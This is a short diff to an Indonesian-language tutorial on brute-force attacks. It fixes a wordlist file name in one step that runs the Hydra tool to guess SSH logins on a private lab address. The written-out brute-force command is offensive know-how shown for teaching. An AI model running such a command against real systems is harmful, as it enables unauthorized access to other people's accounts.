@@ -126,7 +126,7 @@ Brute force attack adalah metode peretasan yang dilakukan menggunakan cara trial
 
 4. Selanjutnya kita jalankan command Hydra untuk memulai proses bruteforcenya dengan menggunakan ip target 192.168.1.9
 
-    ```$ hydra -L usernames.txt -P password.txt ssh://192.168.1.9```
+    ```$ hydra -L username.txt -P password.txt ssh://192.168.1.9```
 
     ![Screenshot](images/13.png)
 
